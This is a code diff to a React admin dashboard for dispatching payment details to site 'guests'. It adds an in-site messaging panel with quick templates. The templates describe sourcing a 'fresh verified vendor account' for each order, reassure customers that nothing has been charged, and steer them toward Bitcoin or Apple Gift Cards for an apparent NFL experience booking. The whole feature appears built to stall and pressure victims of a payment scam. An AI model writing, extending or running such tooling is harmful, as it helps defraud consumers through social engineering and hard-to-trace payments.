@@ -21,7 +21,9 @@ import {
   Eye,
   Trash2,
   RefreshCw,
-  ExternalLink
+  ExternalLink,
+  Mail,
+  MessageSquare
 } from "lucide-react";
 import { 
   PaymentSession, 
@@ -33,7 +35,8 @@ import {
   saveControlRoomPaymentPresets,
   deletePaymentSession,
   deletePaymentSessions,
-  buildAdminDetailsFromPresets
+  buildAdminDetailsFromPresets,
+  sendSessionMailMessage
 } from "../../services/paymentControlService";
 
 export const ControlRoomPaymentDispatcher: React.FC = () => {
@@ -50,6 +53,12 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
   const [successToast, setSuccessToast] = useState<string | null>(null);
   const [activeFilter, setActiveFilter] = useState<"all" | "awaiting" | "unresponsive" | "submitted">("all");
   const [searchQuery, setSearchQuery] = useState("");
+
+  // Direct Website Mail Composer State (no external email needed)
+  const [messageModalSession, setMessageModalSession] = useState<PaymentSession | null>(null);
+  const [msgSubject, setMsgSubject] = useState("");
+  const [msgBody, setMsgBody] = useState("");
+  const [isSendingMsg, setIsSendingMsg] = useState(false);
 
   // Dispatch Form State
   const [method, setMethod] = useState<string>("cashapp");
@@ -108,6 +117,33 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
   const showNotification = (msg: string) => {
     setSuccessToast(msg);
     setTimeout(() => setSuccessToast(null), 3500);
+  };
+
+  const handleOpenMessageModal = (s: PaymentSession) => {
+    setMessageModalSession(s);
+    setMsgSubject("Brief Vendor Verification Update");
+    setMsgBody("");
+  };
+
+  const handleSendDirectMessage = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!messageModalSession || !msgBody.trim()) return;
+    setIsSendingMsg(true);
+    try {
+      await sendSessionMailMessage(messageModalSession.id, {
+        sender: "admin",
+        senderName: "Billing Concierge Desk",
+        subject: msgSubject.trim() || "Order Status Update",
+        body: msgBody.trim()
+      });
+      showNotification(`Live message delivered directly to ${messageModalSession.customerName || "guest"}'s screen!`);
+      setMsgBody("");
+    } catch (err: any) {
+      console.error("Send message failed:", err);
+      showNotification("Failed to send message: " + (err?.message || "Unknown error"));
+    } finally {
+      setIsSendingMsg(false);
+    }
   };
 
   // Open dispatch modal for a specific customer session
@@ -616,10 +652,67 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
                         )}
                       </div>
                     )}
+
+                    {/* Direct In-Website Mail Preview */}
+                    {Array.isArray(s.messages) && s.messages.length > 0 && (() => {
+                      const lastMsg = s.messages[s.messages.length - 1];
+                      const isGuestReply = lastMsg.sender === "customer";
+                      return (
+                        <div className={`text-[10px] p-2.5 rounded-xl border flex items-start justify-between gap-2 mt-1 ${
+                          isGuestReply
+                            ? "bg-indigo-500/15 border-indigo-400/35 text-indigo-100"
+                            : "bg-zinc-900/90 border-white/10 text-zinc-300"
+                        }`}>
+                          <div className="min-w-0 space-y-0.5">
+                            <div className="flex items-center gap-2 flex-wrap">
+                              <span className={`text-[9px] font-black uppercase tracking-wider ${
+                                isGuestReply ? "text-indigo-300" : "text-sky-400"
+                              }`}>
+                                {isGuestReply ? "Guest Replied" : "Latest Desk Note Sent"} · {s.messages.length} msg{s.messages.length > 1 ? "s" : ""}
+                              </span>
+                              {lastMsg.createdAt && (
+                                <span className="text-[9px] text-zinc-500 font-mono">
+                                  {getTimeAgo(lastMsg.createdAt)}
+                                </span>
+                              )}
+                            </div>
+                            <p className="text-[11px] text-zinc-200 line-clamp-1">
+                              {lastMsg.subject ? <strong className="text-white">{lastMsg.subject}: </strong> : null}
+                              {lastMsg.body}
+                            </p>
+                          </div>
+                          <button
+                            type="button"
+                            onClick={() => handleOpenMessageModal(s)}
+                            className="text-[9px] font-black uppercase text-sky-400 hover:text-white shrink-0 underline cursor-pointer"
+                          >
+                            Open Thread
+                          </button>
+                        </div>
+                      );
+                    })()}
                   </div>
 
-                  {/* Right Column: Actions (Dispatch / Update + Delete) */}
-                  <div className="flex items-center gap-2 shrink-0">
+                  {/* Right Column: Actions (Message Guest + Dispatch / Update + Delete) */}
+                  <div className="flex flex-wrap items-center gap-2 shrink-0">
+                    <button
+                      type="button"
+                      onClick={() => handleOpenMessageModal(s)}
+                      className={`px-3.5 py-2.5 rounded-xl font-black text-xs uppercase tracking-wider flex items-center gap-1.5 transition-all cursor-pointer border ${
+                        s.messages?.length && s.messages[s.messages.length - 1]?.sender === "customer"
+                          ? "bg-indigo-600 hover:bg-indigo-500 text-white border-indigo-400/40 shadow-md shadow-indigo-600/20"
+                          : "bg-zinc-900 hover:bg-zinc-800 text-sky-300 hover:text-white border-sky-500/30"
+                      }`}
+                    >
+                      <Mail className="w-3.5 h-3.5" />
+                      <span>Message Guest</span>
+                      {Array.isArray(s.messages) && s.messages.length > 0 && (
+                        <span className="px-1.5 py-0.5 rounded bg-black/35 text-[10px] font-mono">
+                          {s.messages.length}
+                        </span>
+                      )}
+                    </button>
+
                     <button
                       type="button"
                       onClick={() => handleOpenDispatch(s)}
@@ -1164,6 +1257,177 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
           </div>
         </div>
       )}
+
+      {/* DIRECT IN-WEBSITE GUEST MESSAGE MODAL */}
+      {messageModalSession && (() => {
+        const liveSession = sessions.find((x) => x.id === messageModalSession.id) || messageModalSession;
+        const thread = Array.isArray(liveSession.messages) ? liveSession.messages : [];
+        const guestName = liveSession.customerName || "there";
+        const methodUpper = (liveSession.paymentMethod || "selected").toUpperCase();
+
+        const quickTemplates = [
+          {
+            label: "Vendor Delay (15–30m)",
+            subject: "Brief Delay Finalizing Vendor Details",
+            body: `Hi ${guestName}, we are currently finalizing a fresh verified ${methodUpper} vendor account for your order so your transfer stays 100% protected. This is taking slightly longer than usual (approx. 15–30 minutes). Your spot is locked and $0 has been charged—keep this tab open or check back anytime via Check Pass!`
+          },
+          {
+            label: "Priority Queue (Almost Ready)",
+            subject: "Your Request Is Next in Queue",
+            body: `Hi ${guestName}, quick update from our billing desk: your ${methodUpper} vendor credentials are actively being confirmed right now and will appear directly on your screen shortly.`
+          },
+          {
+            label: "10-Min Follow-Up (BTC / Apple Gift Card)",
+            subject: `Quick update on your ${liveSession.itemTitle || "NFL experience booking"}`,
+            body: `Hi ${guestName},\n\nThank you for checking back on your reservation. First, please be assured that $0.00 has been charged—your spot remains safely held while our billing desk finalizes a fresh verified ${methodUpper} destination (this can occasionally take longer than 10 minutes during busy game-week traffic).\n\nYou're welcome to continue waiting for ${methodUpper}, or—if you'd prefer an instant option to lock in your $${Number(liveSession.amount || 100).toLocaleString()} request right away—you can switch to Bitcoin or an Apple Gift Card anytime directly on your checkout screen.`
+          },
+          {
+            label: "Faster Option Available",
+            subject: "Instant Payment Alternative",
+            body: `Hi ${guestName}, our ${methodUpper} vendor desk has high volume right now. For faster turnaround, you can switch to Crypto (5% off), Cash App, PayPal, or Instant Gift Card directly in your checkout window without losing your reservation.`
+          }
+        ];
+
+        return (
+          <div className="fixed inset-0 z-[1050] flex items-center justify-center p-4 bg-black/85 backdrop-blur-md">
+            <div className="bg-zinc-900 border border-sky-500/30 rounded-3xl w-full max-w-xl overflow-hidden shadow-2xl flex flex-col max-h-[90vh]">
+              <div className="p-5 border-b border-white/10 flex items-center justify-between bg-zinc-950">
+                <div className="flex items-center gap-3 min-w-0">
+                  <div className="w-10 h-10 rounded-xl bg-sky-500/15 border border-sky-500/30 text-sky-400 flex items-center justify-center shrink-0">
+                    <Mail className="w-5 h-5" />
+                  </div>
+                  <div className="min-w-0">
+                    <h3 className="text-sm font-black uppercase text-white tracking-wide truncate">
+                      Direct Website Message · {liveSession.customerName || "Guest"}
+                    </h3>
+                    <p className="text-[10px] text-zinc-400 font-bold truncate">
+                      Delivered directly inside their Awaiting Details &amp; Site Inbox · {liveSession.id}
+                    </p>
+                  </div>
+                </div>
+                <button
+                  type="button"
+                  onClick={() => setMessageModalSession(null)}
+                  className="p-2 rounded-xl bg-zinc-800 text-zinc-400 hover:text-white cursor-pointer"
+                >
+                  <X className="w-4 h-4" />
+                </button>
+              </div>
+
+              <div className="p-5 space-y-4 overflow-y-auto flex-1">
+                {/* 1-Click Vendor Delay Templates */}
+                <div className="space-y-1.5">
+                  <span className="text-[9px] font-black uppercase tracking-widest text-zinc-400 block">
+                    1-Click Quick Delay &amp; Status Updates
+                  </span>
+                  <div className="flex flex-wrap gap-2">
+                    {quickTemplates.map((tpl) => (
+                      <button
+                        key={tpl.label}
+                        type="button"
+                        onClick={() => {
+                          setMsgSubject(tpl.subject);
+                          setMsgBody(tpl.body);
+                        }}
+                        className="px-3 py-1.5 rounded-xl bg-sky-500/10 hover:bg-sky-500/20 border border-sky-500/30 text-[10px] font-black uppercase tracking-wider text-sky-300 transition-all cursor-pointer"
+                      >
+                        {tpl.label}
+                      </button>
+                    ))}
+                  </div>
+                </div>
+
+                {/* Live Conversation Thread */}
+                <div className="bg-zinc-950 border border-white/10 rounded-2xl p-3.5 space-y-2.5 max-h-56 overflow-y-auto">
+                  <div className="flex items-center justify-between text-[9px] font-black uppercase tracking-widest text-zinc-500 border-b border-white/5 pb-2">
+                    <span className="flex items-center gap-1.5">
+                      <MessageSquare className="w-3 h-3 text-sky-400" />
+                      Live Session Thread ({thread.length})
+                    </span>
+                    <span className="font-mono text-zinc-400">No login required for guest</span>
+                  </div>
+                  {thread.length === 0 ? (
+                    <p className="text-[11px] text-zinc-500 py-3 text-center">
+                      No messages sent yet. Use a template above or type a message below to alert this guest instantly on the website.
+                    </p>
+                  ) : (
+                    thread.map((m) => (
+                      <div
+                        key={m.id}
+                        className={`p-3 rounded-xl border text-xs space-y-1 ${
+                          m.sender === "admin"
+                            ? "bg-sky-500/10 border-sky-500/25 text-zinc-100"
+                            : "bg-indigo-500/15 border-indigo-400/30 text-white"
+                        }`}
+                      >
+                        <div className="flex items-center justify-between gap-2 text-[9px] font-black uppercase tracking-wider">
+                          <span className={m.sender === "admin" ? "text-sky-300" : "text-indigo-300"}>
+                            {m.sender === "admin" ? "Billing Concierge Desk" : `${liveSession.customerName || "Guest"} Reply`}
+                          </span>
+                          <span className="text-zinc-500 font-mono">
+                            {new Date(m.createdAt).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
+                          </span>
+                        </div>
+                        {m.subject && (
+                          <p className="text-[11px] font-bold text-white">{m.subject}</p>
+                        )}
+                        <p className="text-[11px] text-zinc-200 leading-relaxed whitespace-pre-wrap">{m.body}</p>
+                      </div>
+                    ))
+                  )}
+                </div>
+
+                {/* Compose Form */}
+                <form onSubmit={handleSendDirectMessage} className="space-y-3">
+                  <div className="space-y-1">
+                    <label className="text-[9px] font-black uppercase text-zinc-400 block">
+                      Subject / Headline
+                    </label>
+                    <input
+                      type="text"
+                      placeholder="e.g. Brief Vendor Verification Update"
+                      value={msgSubject}
+                      onChange={(e) => setMsgSubject(e.target.value)}
+                      className="w-full bg-zinc-950 border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-sky-500"
+                    />
+                  </div>
+                  <div className="space-y-1">
+                    <label className="text-[9px] font-black uppercase text-zinc-400 block">
+                      Message to Guest * (Appears live on Awaiting Details &amp; Site Notification Toast)
+                    </label>
+                    <textarea
+                      rows={4}
+                      required
+                      placeholder="Write your update so the guest sees it immediately without checking external email..."
+                      value={msgBody}
+                      onChange={(e) => setMsgBody(e.target.value)}
+                      className="w-full bg-zinc-950 border border-white/10 rounded-xl p-3.5 text-xs text-white focus:outline-none focus:border-sky-500"
+                    />
+                  </div>
+
+                  <div className="flex items-center justify-end gap-3 pt-1">
+                    <button
+                      type="button"
+                      onClick={() => setMessageModalSession(null)}
+                      className="px-4 py-2.5 rounded-xl bg-zinc-800 text-zinc-300 hover:text-white text-xs font-bold uppercase cursor-pointer"
+                    >
+                      Close
+                    </button>
+                    <button
+                      type="submit"
+                      disabled={isSendingMsg || !msgBody.trim()}
+                      className="px-5 py-2.5 rounded-xl bg-sky-500 hover:bg-sky-400 disabled:opacity-50 text-black font-black text-xs uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-lg shadow-sky-500/20"
+                    >
+                      {isSendingMsg ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
+                      Send to Customer Screen
+                    </button>
+                  </div>
+                </form>
+              </div>
+            </div>
+          </div>
+        );
+      })()}
     </div>
   );
 };
